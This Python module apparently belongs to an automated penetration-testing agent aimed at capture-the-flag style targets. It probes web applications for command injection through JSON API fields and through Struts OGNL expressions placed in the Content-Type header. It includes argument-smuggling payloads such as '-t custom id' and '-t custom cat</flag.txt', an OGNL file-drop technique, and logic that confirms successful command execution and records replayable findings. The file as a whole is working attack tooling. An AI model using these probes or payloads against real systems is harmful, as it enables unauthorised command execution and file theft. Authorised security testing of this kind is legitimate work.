from __future__ import annotations

import html
import json

from ravage.agent_core.agent_state import AgentState
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, ResponseDelta, compare_responses
from ravage.probe_suite_parts.command.command_payloads import (
    _COMMAND_PROOF_COMMANDS,
    _command_proof_payloads,
    _json_command_baseline,
    _json_command_signal_payloads,
    _ognl_file_drop_payloads,
    _ognl_payload_variants,
)
from ravage.probe_suite_parts.command.command_sessions import _short_command_session
from ravage.probe_suite_parts.command.command_signals import _has_command_proof, command_payload_signal
from ravage.probe_suite_parts.general import _api_candidate_endpoints, safe_get
from ravage.probe_suite_parts.support import (
    _common_paths,
    _dedupe,
    _form_targets,
    _surface_endpoint_items,
    _surface_endpoints,
)
from ravage.web_core.proof_recognizer import recognize_proofs


def _probe_command_json_api(
    session: ProbeSession,
    state: AgentState,
    marker: str,
    payloads: dict[str, str],
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    endpoints = _api_candidate_endpoints(state) or _surface_endpoint_items(state)[:8]
    option_findings, option_requests, budget = _probe_command_json_option_style_custom(
        session,
        endpoints,
        budget,
    )
    findings.extend(option_findings)
    requests.extend(option_requests)
    if _has_command_proof(findings) or budget <= 0:
        return findings, requests, budget
    json_payloads = _json_command_signal_payloads(payloads)
    for endpoint in endpoints[:6]:
        url = str(endpoint.get("url") or "")
        if not url:
            continue
        for field in _json_command_fields(endpoint):
            baseline = _post_json_field(session, url, field, _json_command_baseline(field))
            requests.append(baseline.summary(body_chars=120) | {"probe_kind": "command_json_baseline", "field": field})
            for payload, expected in json_payloads:
                response = _post_json_field(session, url, field, payload)
                requests.append(
                    response.summary(body_chars=180)
                    | {"probe_kind": "command_json_signal", "field": field}
                )
                delta = compare_responses(baseline, response, marker=payload)
                if not command_payload_signal(response, expected, payload, delta):
                    continue
                findings.append(
                    {
                        "type": "command_boundary_signal",
                        "input": {"kind": "json_api", "url": url, "name": field},
                        "payload": payload,
                        "expected": expected,
                        "delta": delta.to_json(),
                        "response": response.summary(body_chars=260),
                        "replay": {"method": "POST", "url": url, "json": {field: "PAYLOAD"}},
                    }
                )
                proof_findings, proof_requests, budget = _probe_command_json_proofs(
                    session,
                    url,
                    field,
                    payload,
                    marker,
                    budget,
                )
                findings.extend(proof_findings)
                requests.extend(proof_requests)
                break
            if _has_command_proof(findings) or budget <= 0:
                break
        if _has_command_proof(findings) or budget <= 0:
            break
    return findings, requests, budget


def _probe_command_json_option_style_custom(
    session: ProbeSession,
    endpoints: list[dict[str, object]],
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    for endpoint in endpoints[:6]:
        url = str(endpoint.get("url") or "")
        if not url:
            continue
        for field in _json_command_fields(endpoint):
            baseline = _post_json_field(session, url, field, _json_command_baseline(field))
            requests.append(
                baseline.summary(body_chars=120)
                | {"probe_kind": "command_json_option_baseline", "field": field}
            )
            for payload in _json_option_custom_signal_payloads():
                response = _post_json_field(session, url, field, payload)
                requests.append(
                    response.summary(body_chars=240)
                    | {"probe_kind": "command_json_option_signal", "field": field}
                )
                if not _json_option_custom_signal(response):
                    continue
                findings.append(
                    {
                        "type": "command_boundary_signal",
                        "input": {"kind": "json_api", "url": url, "name": field, "style": "option_custom"},
                        "payload": payload,
                        "expected": "uid=/gid= command output",
                        "response": response.summary(body_chars=360),
                        "replay": {"method": "POST", "url": url, "json": {field: "PAYLOAD"}},
                    }
                )
                proof_findings, proof_requests, budget = _probe_command_json_option_style_proofs(
                    session,
                    url,
                    field,
                    budget,
                )
                findings.extend(proof_findings)
                requests.extend(proof_requests)
                if _has_command_proof(findings) or budget <= 0:
                    return findings, requests, budget
                break
            if budget <= 0:
                break
        if budget <= 0:
            break
    return findings, requests, budget


def _json_option_custom_signal_payloads() -> tuple[str, ...]:
    return ("-t custom id",)


def _json_option_custom_signal(response: ProbeResponse) -> bool:
    body = html.unescape(response.body).lower()
    return "uid=" in body and "gid=" in body


def _probe_command_json_option_style_proofs(
    session: ProbeSession,
    url: str,
    field: str,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    for payload in _json_option_custom_proof_payloads():
        if budget <= 0:
            break
        budget -= 1
        response = _post_json_field(session, url, field, payload)
        requests.append(
            response.summary(body_chars=420)
            | {"probe_kind": "command_json_option_proof", "field": field}
        )
        proofs = recognize_proofs(response.body)
        if not proofs:
            continue
        findings.append(
            {
                "type": "command_boundary_proof",
                "input": {"kind": "json_api", "url": url, "name": field, "style": "option_custom"},
                "payload": payload,
                "proofs": proofs[:5],
                "replay": {"method": "POST", "url": url, "json": {field: "PAYLOAD"}},
                "response": response.summary(body_chars=800),
            }
        )
        break
    return findings, requests, budget


def _json_option_custom_proof_payloads() -> tuple[str, ...]:
    paths = (
        "/FLAG.txt",
        "/flag.txt",
        "/FLAG",
        "/flag",
        "/app/FLAG.txt",
        "/usr/src/app/FLAG.txt",
        "/tmp/flag",
    )
    payloads: list[str] = []
    for path in paths:
        payloads.append(f"-t custom cat<{path}")
        payloads.append(f"-t custom /bin/cat<{path}")
    return tuple(payloads)

def _probe_command_ognl_headers(
    session: ProbeSession,
    state: AgentState,
    marker: str,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    active_session = _short_command_session(session)
    urls = _command_header_candidate_urls(session, state)
    signal_payloads = _ognl_payload_variants(f"echo {marker}")
    for url in urls[:16]:
        baseline = active_session.request("POST", url, data=b"", headers={"Content-Type": "multipart/form-data"})
        requests.append(baseline.summary(body_chars=120) | {"probe_kind": "command_ognl_baseline"})
        for payload in signal_payloads:
            response = active_session.request("POST", url, data=b"", headers={"Content-Type": payload})
            requests.append(response.summary(body_chars=220) | {"probe_kind": "command_ognl_signal"})
            delta = compare_responses(baseline, response, marker=marker)
            if not _ognl_header_signal(baseline, response, marker, delta):
                continue
            findings.append(
                {
                    "type": "command_boundary_signal",
                    "input": {"url": url, "location": "Content-Type", "hints": ["ognl", "header"]},
                    "payload": "OGNL_COMMAND_PAYLOAD",
                    "expected": marker,
                    "delta": delta.to_json(),
                    "response": response.summary(body_chars=300),
                }
            )
            proof_findings, proof_requests, budget = _probe_ognl_header_proofs(active_session, url, marker, budget)
            findings.extend(proof_findings)
            requests.extend(proof_requests)
            break
        if _has_command_proof(findings) or budget <= 0:
            break
    return findings, requests, budget

def _ognl_header_signal(
    baseline: ProbeResponse,
    response: ProbeResponse,
    marker: str,
    delta: ResponseDelta,
) -> bool:
    if marker in response.body or marker in html.unescape(response.body):
        return True
    if response.status is None or baseline.status is None:
        return False
    if not delta.status_changed:
        return False
    # Struts/OGNL parser paths often turn a malformed multipart baseline into a
    # normal action response when the header expression is accepted, even when
    # stdout is swallowed by the framework.
    if baseline.status in {400, 404, 405, 500} and 200 <= response.status < 300:
        return True
    return bool(delta.new_error_markers) and abs(delta.length_delta) > 120

def _probe_ognl_header_proofs(
    session: ProbeSession,
    url: str,
    marker: str,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    for command in _COMMAND_PROOF_COMMANDS:
        if budget <= 0:
            break
        for payload in _ognl_payload_variants(command):
            if budget <= 0:
                break
            response = session.request("POST", url, data=b"", headers={"Content-Type": payload})
            budget -= 1
            requests.append(response.summary(body_chars=420) | {"probe_kind": "command_ognl_proof"})
            proofs = recognize_proofs(response.body)
            if not proofs:
                continue
            findings.append(
                {
                    "type": "command_boundary_proof",
                    "input": {"url": url, "location": "Content-Type", "hints": ["ognl", "header"]},
                    "payload": "OGNL_COMMAND_PAYLOAD",
                    "proofs": proofs[:5],
                    "response": response.summary(body_chars=800),
                }
            )
            return findings, requests, budget
    for payload, fetch_paths in _ognl_file_drop_payloads(marker):
        if budget <= 0:
            break
        response = session.request("POST", url, data=b"", headers={"Content-Type": payload})
        budget -= 1
        requests.append(response.summary(body_chars=220) | {"probe_kind": "command_ognl_file_drop_write"})
        for path in fetch_paths:
            fetched = safe_get(session, session.absolute(path))
            requests.append(fetched.summary(body_chars=300) | {"probe_kind": "command_ognl_file_drop_fetch"})
            proofs = recognize_proofs(fetched.body)
            if proofs:
                findings.append(
                    {
                        "type": "command_boundary_proof",
                        "input": {"url": url, "location": "Content-Type", "hints": ["ognl", "header"]},
                        "payload": "OGNL_FILE_DROP_PAYLOAD",
                        "fetch_url": fetched.url,
                        "proofs": proofs[:5],
                        "response": fetched.summary(body_chars=800),
                    }
                )
                return findings, requests, budget
    return findings, requests, budget

def _command_header_candidate_urls(session: ProbeSession, state: AgentState) -> list[str]:
    urls: list[str] = []
    for form in _form_targets(state, limit=12):
        action = str(form.get("action") or "")
        if action:
            urls.append(action)
    urls.append(session.target_url)
    urls.extend(_surface_endpoints(state))
    urls.extend(_common_paths(session))
    scoped_urls: list[str] = []
    for url in urls:
        if url and session.in_scope(url):
            scoped_urls.append(url)
    return _dedupe(scoped_urls)

def _probe_command_json_proofs(
    session: ProbeSession,
    url: str,
    field: str,
    signal_payload: str,
    marker: str,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    for payload in _command_proof_payloads(signal_payload, marker):
        if budget <= 0:
            break
        budget -= 1
        response = _post_json_field(session, url, field, payload)
        requests.append(response.summary(body_chars=320) | {"probe_kind": "command_json_proof", "field": field})
        proofs = recognize_proofs(response.body)
        if not proofs:
            continue
        findings.append(
            {
                "type": "command_boundary_proof",
                "input": {"kind": "json_api", "url": url, "name": field},
                "payload": payload,
                "proofs": proofs[:5],
                "replay": {"method": "POST", "url": url, "json": {field: "PAYLOAD"}},
                "response": response.summary(body_chars=700),
            }
        )
        break
    return findings, requests, budget

def _post_json_field(session: ProbeSession, url: str, field: str, value: str) -> ProbeResponse:
    body = json.dumps({field: value}).encode("utf-8")
    return session.request("POST", url, data=body, headers={"Content-Type": "application/json"})

def _json_command_fields(endpoint: dict[str, object]) -> list[str]:
    names: list[str] = []
    for key in ("name", "input", "parameter"):
        value = endpoint.get(key)
        if isinstance(value, str) and value:
            names.append(value)
    names.extend(
        [
            "service_name",
            "service",
            "name",
            "target",
            "host",
            "url",
            "ip",
            "domain",
            "address",
            "command",
            "cmd",
            "action",
            "q",
            "query",
            "input",
            "payload",
        ]
    )
    return _dedupe(names)[:10]
